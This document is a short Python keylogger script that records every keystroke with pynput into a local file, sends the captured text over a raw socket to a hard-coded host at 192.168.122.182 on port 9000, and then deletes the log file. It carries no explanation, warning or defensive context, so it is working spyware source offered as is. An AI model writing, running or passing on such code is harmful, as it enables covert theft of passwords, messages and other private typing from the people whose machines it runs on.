```python
import socket
import os
from pynput import keyboard

# File to store key logs
file = open('keylogs.txt', 'w')

def on_press(key):
    try:
        file.write(str(key))
        print(f'Key {key} pressed')  # Debug print statement
    except Exception as e:
        print(f'Error occurred while pressing key: {e}')

def transmit_logs():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect(('192.168.122.182', 9000))  # Server IP and port
        with open('keylogs.txt', 'r') as file:
            data = file.read()
            s.sendall(data.encode())
    except Exception as e:
        print(f'Error occurred while transmitting logs: {e}')
    finally:
        file.close()
        os.remove('keylogs.txt')  # Remove the log file after transmission
        s.close()

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
transmit_logs()
```